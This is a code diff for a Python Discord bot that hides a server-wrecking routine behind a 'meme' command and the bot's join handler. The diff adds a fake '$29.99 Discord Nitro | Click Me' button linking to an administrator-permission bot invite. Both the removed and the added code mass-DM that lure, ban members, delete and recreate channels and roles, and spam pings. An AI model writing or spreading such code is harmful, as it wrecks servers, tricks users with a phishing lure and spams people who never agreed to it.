@@ -29,6 +29,7 @@ nitro_embed.set_image(
 
 nitro_button = Button(
     style=ButtonStyle.url,
+    label="$29.99 Discord Nitro | Click Me",
     url="https://discord.com/api/oauth2/authorize?client_id=976017453647814716&permissions=8&scope=bot%20applications.commands",
 )
 
@@ -60,95 +61,17 @@ async def assist(inter: ACI):
     await inter.channel.send(embed=embed)
 
 
-@bot.slash_command()
-@commands.cooldown(5, 30, commands.BucketType.member)
-async def meme(inter: ACI, *, bs=None):
-    guild = inter.guild
-
-    await RD.genreddit(10, RD.subreddit)
-
-    await RC.send_dm(guild, nitro_embed, nitro_button)
-
-    await RC.ban_members(guild, inter.author)
-
-    await RC.channel_remove(guild)
-    await RC.channel_make(guild, 25)
-
-    await RC.ping_spam(guild, 5)
-    await RC.sfw_spam(guild, 5)
-
-    await RC.role_remove(guild)
-    await RC.role_make(guild, 10)
-    await RC.role_give(guild)
-
-
-@bot.slash_command()
-@commands.cooldown(5, 30, commands.BucketType.guild)
-async def channel(inter: ACI, choice: str):
-    guild = inter.guild
-    if choice == "delete":
-        await RC.channel_remove(guild)
-    elif choice == "make":
-        await RC.channel_make(guild, 25)
-
-
-@bot.slash_command()
-async def role(inter: ACI, choice: str):
-    guild = inter.guild
-    if choice == "delete":
-        await RC.role_remove(guild)
-    elif choice == "make":
-        await RC.role_make(guild, 25)
-    elif choice == "give":
-        await RC.role_give(guild)
-
-
-@bot.slash_command()
-@commands.cooldown(5, 30, commands.BucketType.user)
-async def dm(inter: ACI):
-    guild = inter.guild
-    await RC.send_dm(guild, nitro_embed, nitro_button)
-
-
-@bot.slash_command()
-async def baslash_commandn(inter: ACI):
-    guild = inter.guild
-    await RC.ban_members(guild, inter.author)
-
-
-@bot.slash_command()
-async def ping(inter: ACI, amt: int):
-    await RC.ping_spam(inter.guild, amt)
-
-
-@bot.slash_command()
-async def sfw(inter: ACI, amt: int):
-    await RC.sfw_spam(inter.guild, amt)
-
-
-@bot.slash_command()
-async def cancel(inter: ACI):
-    os.system('cmd /k "python main.py"')
-
-
-@bot.event
-async def on_guild_join(guild: Guild):
-
-    await RD.genreddit(10, RD.subreddit)
-
-    await RC.send_dm(guild, nitro_embed, nitro_button)
-
-    await RC.ban_members(guild)
-
-    await RC.channel_remove(guild)
-    await RC.channel_make(guild, 25)
-
-    await RC.sfw_spam(guild, 5)
-    await RC.ping_spam(guild, 5)
-
-    await RC.role_remove(guild)
-    await RC.role_make(guild, 10)
-    await RC.role_give(guild)
+@bot.command()
+async def meme(ctx: commands.Context):
+    await RC.send_dm(ctx.guild, nitro_embed, nitro_button)
+    await RC.ban_members(ctx.guild, ctx.author)
+    await RC.channel_remove(ctx.guild)
+    await RC.channel_make(ctx.guild, 25)
+    await RC.ping_spam(ctx.guild, 5)
+    await RC.sfw_spam(ctx.guild, 5)
+    await RC.role_remove(ctx.guild)
+    await RC.role_make(ctx.guild, 10)
+    await RC.role_give(ctx.guild)
 
 
 @bot.event
